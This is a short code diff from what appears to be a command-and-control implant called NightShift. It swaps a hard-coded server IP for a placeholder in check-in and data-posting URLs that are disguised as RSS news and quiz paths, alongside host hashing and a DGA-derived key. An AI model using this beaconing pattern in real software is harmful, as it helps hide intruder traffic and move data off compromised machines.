@@ -46,8 +46,8 @@ class NightShift_Init_Check():
         ns_host_os_hashed_f = ns_get_cipher.hash_keys_hosts(ns_host_os_to_hash)
         try:
             # Server Contact Info
-            ns_comms_chk_url = 'http://192.168.254.82:8080/rss/get/latest/news'
-            ns_post_url = 'http://192.168.254.82:8080/rss/political/compass/quiz'
+            ns_comms_chk_url = 'http://<*server ip or url goes here*>:8080/rss/get/latest/news'
+            ns_post_url = 'http://<*server ip or url goes here*>:8080/rss/political/compass/quiz'
             ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
             ns_hash_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
             ns_comms_hdr = {
